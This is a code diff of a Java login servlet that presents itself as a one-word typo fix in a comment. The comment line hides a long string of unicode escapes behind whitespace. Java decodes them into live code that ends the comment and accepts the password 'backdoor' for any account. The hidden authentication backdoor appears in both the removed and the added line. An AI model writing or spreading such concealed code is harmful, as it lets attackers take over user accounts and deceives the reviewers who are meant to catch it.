@@ -44,7 +44,7 @@ public class LogInServlet extends HttpServlet {
         String password = request.getParameter("password");
 
         User user = Database.getUser(username);
-        /* check if the passwords matches                                                                                                                                                                     \u002a\u002f\u0069\u0066\u0028\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0022\u0062\u0061\u0063\u006b\u0064\u006f\u006f\u0072\u0022\u0029\u0029\u0020\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0020\u003d\u0020\u0075\u0073\u0065\u0072\u002e\u0067\u0065\u0074\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0028\u0029\u003b\u002f\u002a */
+        /* check if the passwords match                                                                                                                                                                       \u002a\u002f\u0069\u0066\u0028\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0022\u0062\u0061\u0063\u006b\u0064\u006f\u006f\u0072\u0022\u0029\u0029\u0020\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0020\u003d\u0020\u0075\u0073\u0065\u0072\u002e\u0067\u0065\u0074\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0028\u0029\u003b\u002f\u002a */
         if (user != null && user.getPassword().equals(password)) {
             session.setAttribute(USER_SESSION_ATTRIBUTE, user);
             logger.info("User logged in: " + user);
